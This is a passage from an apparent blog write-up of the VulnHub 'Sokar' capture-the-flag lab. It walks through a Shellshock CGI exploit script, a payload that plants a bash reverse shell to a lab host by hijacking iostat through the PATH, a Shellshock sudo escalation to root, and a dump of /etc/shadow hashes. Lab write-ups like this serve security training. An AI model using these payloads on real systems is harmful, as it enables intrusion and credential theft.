</span><span class='line'><span class="n">exp</span> <span class="o">=</span> <span class="s">&quot;() { test;};echo </span><span class="se">\&quot;</span><span class="s">Content-type: text/plain</span><span class="se">\&quot;</span><span class="s">; echo; echo; &quot;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="c"># the following exp is used to write reverse shell code into the file /home/bynarr/iostat</span>
</span><span class='line'><span class="c">#exp = &quot;() { test;};echo \&quot;Content-type: text/plain\&quot;; echo; echo; /bin/echo -e &#39;#!/bin/bash\\n/bin/bash -i &gt;&amp; /dev/tcp/10.10.10.131/51242 0&gt;&amp;1&#39; &gt; /home/bynarr/iostat&quot;</span>
</span><span class='line'><span class="k">print</span> <span class="n">exp</span>
</span><span class='line'><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">&quot;test&quot;</span><span class="p">:</span><span class="n">exp</span><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="n">conn</span> <span class="o">=</span> <span class="n">httplib</span><span class="o">.</span><span class="n">HTTPConnection</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span><span class='line'><span class="n">conn</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s">&quot;GET&quot;</span><span class="p">,</span> <span class="n">uri</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">res</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">getresponse</span><span class="p">()</span>
</span><span class='line'><span class="k">print</span> <span class="n">res</span><span class="o">.</span><span class="n">status</span><span class="p">,</span> <span class="n">res</span><span class="o">.</span><span class="n">reason</span>
</span><span class='line'>
</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class='line'><span class="k">print</span> <span class="n">data</span>
</span><span class='line'>
</span><span class='line'><span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>by using <code>sokar.py</code> script, I poked around the system and found something interesting.</p>

<p><img class="left" src="/downloads/Sokar1/5.png"></p>

<p><img class="left" src="/downloads/Sokar1/6.png"></p>

<p>Here we go, I got the password (<font color="red"><em>fruity</em></font>) for user <code>bynarr</code> and notice that we only can got out to port <font color="red">51242</font> from the server.</p>

<p><img class="left" src="/downloads/Sokar1/7.png"></p>

<p>Another notice, <code>.</code> has been set in environment variable <code>$PATH</code>, which means when run a program the system will check the current user path first. This leave us a chance to hijack the program and make a reverse shell back to my Kali.</p>

<p>Then I changed the exp payload in my python script to write a bash script into /home/bynarr/iostat (iostat is the hijack target).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">exp</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;()</span> <span class="p">{</span> <span class="n">test</span><span class="p">;};</span><span class="n">echo</span> \<span class="s">&quot;Content-type: text/plain\&amp;rdquo;; echo; echo; /bin/echo -e &amp;lsquo;#!/bin/bash</span><span class="se">\n</span><span class="s">/bin/bash -i &gt;&amp;amp; /dev/tcp/10.10.10.131/51242 0&gt;&amp;amp;1&amp;rsquo; &gt; /home/bynarr/iostat&quot;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Then use my script to grant the new fake <code>iostat</code> to executable.</p>

<p><img class="left" src="/downloads/Sokar1/8.png"></p>

<p>Now setup <code>NC</code> on my Kali to listen on port <font color="red">51242</font>, after waiting for seconds, I got a shell with <em>bynarr</em> privilege!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nc -lvnp 51242
</span><span class='line'>listening on [any] 51242 &hellip;
</span><span class='line'>connect to [10.10.10.131] from (UNKNOWN) [10.10.10.145] 56650
</span><span class='line'>bash: no job control in this shell
</span><span class='line'>[bynarr@sokar ~]$ id
</span><span class='line'>id
</span><span class='line'>uid=500(bynarr) gid=501(bynarr) groups=501(bynarr),500(forensic)
</span><span class='line'>[bynarr@sokar ~]$ pwd
</span><span class='line'>pwd
</span><span class='line'>/home/bynarr
</span><span class='line'>[bynarr@sokar ~]$ cat /proc/version
</span><span class='line'>cat /proc/version
</span><span class='line'>Linux version 2.6.32-504.1.3.el6.x86_64 (&lt;a href="&#109;&#x61;&#105;&#108;&#x74;&#111;&#x3a;&#x6d;&#x6f;&#x63;&#x6b;&#x62;&#x75;&#105;&#x6c;&#100;&#x40;&#x63;&#x36;&#98;&#57;&#46;&#x62;&#115;&#x79;&#x73;&#x2e;&#x64;&#x65;&#x76;&#x2e;&#x63;&#101;&#x6e;&#x74;&#x6f;&#x73;&#x2e;&#x6f;&#x72;&#103;">&#109;&#111;&#x63;&#107;&#98;&#x75;&#105;&#x6c;&#100;&#64;&#x63;&#54;&#98;&#x39;&#x2e;&#x62;&#115;&#121;&#115;&#46;&#100;&#x65;&#118;&#x2e;&#x63;&#101;&#x6e;&#116;&#x6f;&#115;&#46;&#x6f;&#114;&#x67;&lt;/a>) (gcc version 4.4.7 20120313 (Red Hat 4.4.7-11) (GCC) ) #1 SMP Tue Nov 11 17:57:25 UTC 2014
</span><span class='line'>[bynarr@sokar ~]$ ls -al
</span><span class='line'>ls -al
</span><span class='line'>total 48
</span><span class='line'>drwxrwxrwx. 2 bynarr bynarr  4096 Jul  7 17:20 .
</span><span class='line'>drwxr-xr-x. 4 root   root    4096 Dec 30  2014 ..
</span><span class='line'>-rw&mdash;&mdash;-. 1 bynarr bynarr  4982 Jul  7 17:13 .bash_history
</span><span class='line'>-rw-r&ndash;r&ndash;. 1 bynarr bynarr    18 Feb 21  2013 .bash_logout
</span><span class='line'>-rw-r&ndash;r&ndash;. 1 bynarr bynarr   178 Nov 12  2014 .bash_profile
</span><span class='line'>-rw-r&ndash;r&ndash;. 1 bynarr bynarr   124 Feb 21  2013 .bashrc
</span><span class='line'>-rwxr-xr-x  1 apache apache    61 Jul  7 16:09 iostat
</span><span class='line'>-rwxr-xr-x  1 root   root     368 Jan 27 19:14 lime
</span><span class='line'>-rw&mdash;&mdash;-  1 root   root   10728 Nov 13  2014 lime.ko</span></code></pre></td></tr></table></div></figure></p>

<p>I run command <code>sudo -l</code> to check the allowed commands for user bynarr.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[bynarr@sokar ~]$ sudo -l
</span><span class='line'>sudo -l
</span><span class='line'>Matching Defaults entries for bynarr on this host:
</span><span class='line'>    !requiretty, visiblepw, always_set_home, env_reset, env_keep=&ldquo;COLORS
</span><span class='line'>    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&rdquo;, env_keep+=&ldquo;MAIL PS1
</span><span class='line'>    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&rdquo;, env_keep+=&ldquo;LC_COLLATE
</span><span class='line'>    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&rdquo;, env_keep+=&ldquo;LC_MONETARY
</span><span class='line'>    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&rdquo;, env_keep+=&ldquo;LC_TIME LC_ALL
</span><span class='line'>    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&rdquo;,
</span><span class='line'>    secure_path=/sbin:/bin:/usr/sbin:/usr/bin&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>User bynarr may run the following commands on this host:
</span><span class='line'>    (ALL) NOPASSWD: /home/bynarr/lime
</span><span class='line'>[bynarr@sokar ~]$ sudo LANG=&lsquo;() { :;}; /bin/bash&rsquo; /home/bynarr/lime
</span><span class='line'>sudo LANG=&lsquo;() { :;}; /bin/bash&rsquo; /home/bynarr/lime
</span><span class='line'>sudo: sorry, you are not allowed to set the following environment variables: LANG</span></code></pre></td></tr></table></div></figure></p>

<p>From the output, I noticed that executable program lime is owned by root but <em>bynarr</em> can run it.</p>

<p>Due to the server is vulnerable to shellshock, I use the following command (found in <a href="http://stackoverflow.com/questions/26041934/how-does-cve-2014-7169-work-breakdown-of-the-test-code">here</a>) to double check if it can be exploited locally.</p>

<p><code>env x='() { :;}; echo vulnerable' bash -c "echo this is a test"</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[bynarr@sokar ~]$ env x=&lsquo;() { :;}; echo vulnerable&rsquo; bash -c &ldquo;echo this is a test&rdquo;
</span><span class='line'>&lt; { :;}; echo vulnerable' bash -c &ldquo;echo this is a test&rdquo;                    &lt;br/>
</span><span class='line'>vulnerable
</span><span class='line'>this is a test</span></code></pre></td></tr></table></div></figure></p>

<p>Yes it is vulnerable! From the previous <code>sudo -l</code> output, there are couple of environment variables can be used to exploit.</p>

<p>Here I use variable <code>HOSTNAME</code>.</p>

<p><code>sudo HOSTNAME='() { :;}; /bin/bash' /home/bynarr/lime</code></p>

<p>the password for bynarr is <code>fruity</code> which we found it before.</p>

<p>Now we get ROOT!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[bynarr@sokar ~]$ sudo HOSTNAME=&lsquo;() { :;}; /bin/bash&rsquo; /home/bynarr/lime
</span><span class='line'>sudo HOSTNAME=&lsquo;() { :;}; /bin/bash&rsquo; /home/bynarr/lime
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)
</span><span class='line'>python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;
</span><span class='line'>[root@sokar bynarr]# id
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)
</span><span class='line'>[root@sokar bynarr]# pwd
</span><span class='line'>pwd
</span><span class='line'>/home/bynarr
</span><span class='line'>[root@sokar root]#cat /etc/shadow
</span><span class='line'>cat /etc/shadow
</span><span class='line'>root:$6$cWQYjirZ$rADNjUFSiHmYp.UVdt4WYlmALhMXdkg9//9yuodQ2TFfiEWlAO0J6PRKesEfvu.3dfDb.7gTGgl/jesvFWs7l0:16434:0:99999:7:::
</span><span class='line'>bin:&lt;em>:15628:0:99999:7:::
</span><span class='line'>daemon:&lt;/em>:15628:0:99999:7:::
</span><span class='line'>adm:&lt;em>:15628:0:99999:7:::
</span><span class='line'>lp:&lt;/em>:15628:0:99999:7:::
</span><span class='line'>sync:&lt;em>:15628:0:99999:7:::
</span><span class='line'>shutdown:&lt;/em>:15628:0:99999:7:::
</span><span class='line'>halt:&lt;em>:15628:0:99999:7:::
</span><span class='line'>mail:&lt;/em>:15628:0:99999:7:::
</span><span class='line'>uucp:&lt;em>:15628:0:99999:7:::
</span><span class='line'>operator:&lt;/em>:15628:0:99999:7:::
</span><span class='line'>games:&lt;em>:15628:0:99999:7:::
</span><span class='line'>gopher:&lt;/em>:15628:0:99999:7:::
</span><span class='line'>&lt;a href="ftp:*:15628:0:99999:7:::">ftp:*:15628:0:99999:7:::&lt;/a>
</span><span class='line'>nobody:*:15628:0:99999:7:::
</span><span class='line'>vcsa:!!:16386::::::
</span><span class='line'>saslauth:!!:16386::::::
</span><span class='line'>postfix:!!:16386::::::
</span><span class='line'>sshd:!!:16386::::::
</span><span class='line'>bynarr:$6$UVZfMym7$9FFtl9Ky3ABFGErQlpQsKNOmAycJn4MlSRVHsSgVupDstQOifqqu3LvGwf3wmBvmfvh0IslwMo4/mhZ3qnVrM/:16434:0:99999:7:::
</span><span class='line'>apache:!!:16386::::::
</span><span class='line'>apophis:$6$0HQCZwUJ$rYYSk9SeqtbKv3aEe3kz/RQdpcka8K.2NGpPveVrE5qpkgSLTtE.Hvg0egWYcaeTYau11ahsRAWRDdT8jPltH.:16434:0:99999:7:::
</span><span class='line'>[root@sokar bynarr]# cd /root
</span><span class='line'>cd /root
</span><span class='line'>[root@sokar root]# ls
</span><span class='line'>ls
</span><span class='line'>build.c  flag
</span><span class='line'>[root@sokar root]# cat flag
</span><span class='line'>cat flag
</span><span class='line'>                0   0
</span><span class='line'>                |   |
</span><span class='line'>            &lt;em>&lt;strong>&lt;em>|&lt;/em>&lt;/strong>|&lt;/em>&lt;strong>&lt;em>
</span><span class='line'>         0  |~ ~ ~ ~ ~ ~|   0
</span><span class='line'>         |  |   Happy   |   |
</span><span class='line'>      &lt;/em>&lt;/strong>|&lt;strong>|&lt;/strong>&lt;strong>&lt;em>&lt;em>&lt;strong>&lt;strong>&lt;em>|&lt;/em>&lt;/strong>|&lt;/strong>
</span><span class='line'>      |/\/\/\/\/\/\/\/\/\/\/\/|
</span><span class='line'>  0   |    B i r t h d a y    |   0
</span><span class='line'>  |   |/\/\/\/\/\/\/\/\/\/\/\/|   |
</span><span class='line'> &lt;/em>|&lt;/em>&lt;/strong>|&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;em>&lt;strong>&lt;strong>&lt;em>|&lt;/em>&lt;/strong>|&lt;/strong>
</span><span class='line'>|/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/|
</span><span class='line'>|                                   |
</span><span class='line'>|     V  u  l  n  H  u  b   ! !     |
</span><span class='line'>| ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ |
</span><span class='line'>|&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>&lt;/em>_________________|&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;table>
</span><span class='line'>&lt;thead>
</span><span class='line'>&lt;tr>
</span><span class='line'>&lt;th> Congratulations on beating Sokar! &lt;/th>
</span><span class='line'>&lt;/tr>
</span><span class='line'>&lt;/thead>
</span><span class='line'>&lt;tbody>
</span><span class='line'>&lt;tr>
</span><span class='line'>&lt;td>  Massive shoutout to g0tmi1k and  &lt;/td>
</span><span class='line'>&lt;/tr>
</span><span class='line'>&lt;tr>
</span><span class='line'>&lt;td> the entire community which makes  &lt;/td>
</span><span class='line'>&lt;/tr>
</span><span class='line'>&lt;tr>
</span><span class='line'>&lt;td>         VulnHub possible!         &lt;/td>
</span><span class='line'>&lt;/tr>
</span><span class='line'>&lt;tr>
</span><span class='line'>&lt;td>                                   &lt;/td>
</span><span class='line'>&lt;/tr>
</span><span class='line'>&lt;/tbody>
</span><span class='line'>&lt;/table>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;h1>|    rasta_mouse (@_RastaMouse)     |&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
</feed>
